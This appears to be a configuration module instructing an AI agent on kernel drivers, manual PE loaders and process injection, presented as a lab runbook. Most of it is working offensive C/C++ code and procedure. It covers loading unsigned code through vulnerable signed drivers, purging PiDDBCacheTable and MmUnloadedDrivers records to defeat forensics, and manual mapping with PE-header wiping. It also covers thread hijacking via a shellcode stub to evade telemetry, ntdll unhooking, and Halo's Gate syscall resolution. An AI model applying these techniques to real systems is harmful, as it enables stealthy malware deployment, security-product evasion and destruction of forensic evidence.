# Domain — Systems (Kernel, Drivers, Loaders & Resident Modules v2.0)

Loaded when the ticket involves kernel-mode drivers, manual-map PE/ELF loaders, process injection, thread hijacking, syscall extraction, or resident modules on controlled lab systems (§2).

---

## 1. Operating Frame & Classification
Classify strictly by privilege boundary and OS interface:
- **Ring 0 / Kernel:** I/O control (`IRP_MJ_DEVICE_CONTROL`), MDL mapping, physical address traversal, DKOM, driver entry point stubs.
- **Ring 3 / User-Mode:** Virtual memory manipulation, manual PE loading, thread context hijacking, indirect syscall invocation, APC dispatch.
- **Reverse-Path Invariant (§4.4):** Every acquired resource, handle, lifted page protection (`PAGE_EXECUTE_READWRITE`), or hooked dispatch pointer must have a deterministic teardown path executed in LIFO order.

---

## 2. Kernel-Mode Architecture & Driver Operations

### 2.1 Virtual & Physical Memory Read/Write Engine
- **Virtual Memory Copy (`MmCopyVirtualMemory`):**
```c
NTSTATUS ReadProcessMemoryKernel(PEPROCESS SourceProcess, PVOID SourceAddress, PEPROCESS TargetProcess, PVOID TargetAddress, SIZE_T Size, PSIZE_T BytesCopied) {
    KAPC_STATE ApcState;
    KeStackAttachProcess(SourceProcess, &ApcState);
    if (!MmIsAddressValid(SourceAddress)) {
        KeUnstackDetachProcess(&ApcState);
        return STATUS_ACCESS_VIOLATION;
    }
    KeUnstackDetachProcess(&ApcState);
    return MmCopyVirtualMemory(SourceProcess, SourceAddress, TargetProcess, TargetAddress, Size, KernelMode, BytesCopied);
}
```
- **Physical Memory Mapping:**
  Translate target Virtual Address (VA) to Physical Address (PA) via CR3 (Directory Base) page table traversal (`PML4 -> PDPT -> PD -> PT`), map physical frame into system virtual space via `MmMapIoSpaceEx(PA, Size, PAGE_READWRITE)`, copy buffer, and immediately unmap via `MmUnmapIoSpace()`.

### 2.2 Kernel Footprint & Trace Sanitization
When loading unsigned or custom code via signed driver vulnerabilities (`kdmapper` / `GDRV` / `RTCore`):
- **PiDDBCacheTable Purging:** Acquire `PiDDBLock`, traverse `PiDDBCacheTable` AVL tree (`RtlLookupElementGenericTableAvl`), locate entry matching driver filename/timestamp, and unlink via `RtlDeleteElementGenericTableAvl`.
- **MmUnloadedDrivers Erasure:** Locate `MmUnloadedDrivers` array pointer and `MmLastUnloadedDriver` index. Zero matching driver record to prevent forensic detection of unloaded driver events.
- **BigPool Cleanup:** Search kernel big pool allocations for identifiable signature tags and replace with standard pool tags (`Ntfs`, `File`).

---

## 3. User-Mode Manual Map PE Loader (Full Architectural Runbook)

A production-grade manual mapper allocates and maps a dynamic module without creating an entry in the target process PEB (`LdrDataTableEntry`):

```
+-------------------------------------------------------------------+
| 1. Parse Image Headers (DOS -> NT -> Sections)                    |
| 2. VirtualAllocEx(target, SizeOfImage, MEM_COMMIT, PAGE_EXEC_RW)  |
| 3. Copy Section Headers & Raw Section Bytes to VirtualAddress     |
| 4. Process Base Relocations (IMAGE_DIRECTORY_ENTRY_BASERELOC)     |
| 5. Resolve Import Address Table (IMAGE_DIRECTORY_ENTRY_IMPORT)    |
| 6. Execute TLS Callbacks (IMAGE_DIRECTORY_ENTRY_TLS)             |
| 7. Wipe PE Headers (Zero 0x1000 bytes at base)                    |
| 8. Invoke DllMain / EntryPoint via Hijacked Thread or Entry Stub  |
+-------------------------------------------------------------------+
```

### 3.1 Base Relocation Parsing
```cpp
void ProcessRelocations(BYTE* localBase, BYTE* remoteBase, IMAGE_NT_HEADERS* ntHeaders) {
    DWORD relocDirRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
    if (!relocDirRVA) return;

    IMAGE_BASE_RELOCATION* pReloc = (IMAGE_BASE_RELOCATION*)(localBase + relocDirRVA);
    INT_PTR delta = (INT_PTR)(remoteBase - ntHeaders->OptionalHeader.ImageBase);

    while (pReloc->VirtualAddress) {
        DWORD count = (pReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        WORD* pTypeOffset = (WORD*)(pReloc + 1);

        for (DWORD i = 0; i < count; i++) {
            WORD type = pTypeOffset[i] >> 12;
            WORD offset = pTypeOffset[i] & 0xFFF;
            if (type == IMAGE_REL_BASED_DIR64) {
                ULONG64* patchAddr = (ULONG64*)(localBase + pReloc->VirtualAddress + offset);
                *patchAddr += delta;
            } else if (type == IMAGE_REL_BASED_HIGHLOW) {
                DWORD* patchAddr = (DWORD*)(localBase + pReloc->VirtualAddress + offset);
                *patchAddr += (DWORD)delta;
            }
        }
        pReloc = (IMAGE_BASE_RELOCATION*)((BYTE*)pReloc + pReloc->SizeOfBlock);
    }
}
```

### 3.2 Thread Hijacking & Context Redirection
Avoid `CreateRemoteThread` (heavily monitored by telemetry). Hijack an existing running thread:
```cpp
HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, targetTid);
SuspendThread(hThread);

CONTEXT ctx;
ctx.ContextFlags = CONTEXT_FULL;
GetThreadContext(hThread, &ctx);

// Allocate small shellcode stub in target that saves registers, calls payload entry, and restores original RIP
BYTE shellcodeStub[] = {
    0x50, 0x51, 0x52, 0x53, 0x55, 0x56, 0x57, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, // push registers
    0x48, 0x83, 0xEC, 0x28,                               // sub rsp, 40 (shadow space)
    0x48, 0xB8, 0,0,0,0,0,0,0,0,                         // mov rax, payloadEntry
    0xFF, 0xD0,                                           // call rax
    0x48, 0x83, 0xC4, 0x28,                               // add rsp, 40
    0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C, 0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 0x5F, 0x5E, 0x5D, 0x5B, 0x5A, 0x59, 0x58, // pop registers
    0x68, 0,0,0,0,                                       // push low32 original RIP
    0xC7, 0x44, 0x24, 0x04, 0,0,0,0,                     // mov [rsp+4], high32 original RIP
    0xC3                                                  // ret
};
// Write original RIP into stub, write stub to target, point ctx.Rip to stub
ctx.Rip = (DWORD64)pRemoteStub;
SetThreadContext(hThread, &ctx);
ResumeThread(hThread);
CloseHandle(hThread);
```

---

## 4. Syscall Extraction & In-Memory NTDLL Unhooking

### 4.1 Fresh NTDLL Mapping from KnownDlls
When user-mode hooks contaminate local `ntdll.dll`, restore clean code pages without touching disk:
```cpp
HANDLE hSection = NULL;
UNICODE_STRING secName;
RtlInitUnicodeString(&secName, L"\\KnownDlls\\ntdll.dll");
OBJECT_ATTRIBUTES objAttr;
InitializeObjectAttributes(&objAttr, &secName, OBJ_CASE_INSENSITIVE, NULL, NULL);

NTSTATUS status = NtMapViewOfSection(hSection, GetCurrentProcess(), &pCleanNtdll, 0, 0, NULL, &viewSize, ViewShare, 0, PAGE_READONLY);
// Overwrite text section of active ntdll with bytes from pCleanNtdll
```

### 4.2 Dynamic SSN Resolution (Halo's Gate Pattern)
Extract System Service Number (SSN) directly from memory by checking for inline hooks:
```cpp
DWORD GetSyscallNumber(PVOID pFunction) {
    BYTE* p = (BYTE*)pFunction;
    // Standard syscall stub:
    // mov r10, rcx (4C 8B D1)
    // mov eax, SSN (B8 XX XX 00 00)
    if (p[0] == 0x4C && p[1] == 0x8B && p[2] == 0xD1 && p[3] == 0xB8) {
        return *(DWORD*)(p + 4);
    }
    // If hooked with JMP (E9 XX XX XX XX), scan neighboring stubs (Halo's Gate)
    for (int i = 1; i < 32; i++) {
        if (p[i * 32] == 0x4C && p[i * 32 + 1] == 0x8B && p[i * 32 + 2] == 0xD1 && p[i * 32 + 3] == 0xB8) {
            return *(DWORD*)(p + i * 32 + 4) - i;
        }
        if (p[-i * 32] == 0x4C && p[-i * 32 + 1] == 0x8B && p[-i * 32 + 2] == 0xD1 && p[-i * 32 + 3] == 0xB8) {
            return *(DWORD*)(p - i * 32 + 4) + i;
        }
    }
    return 0;
}
```
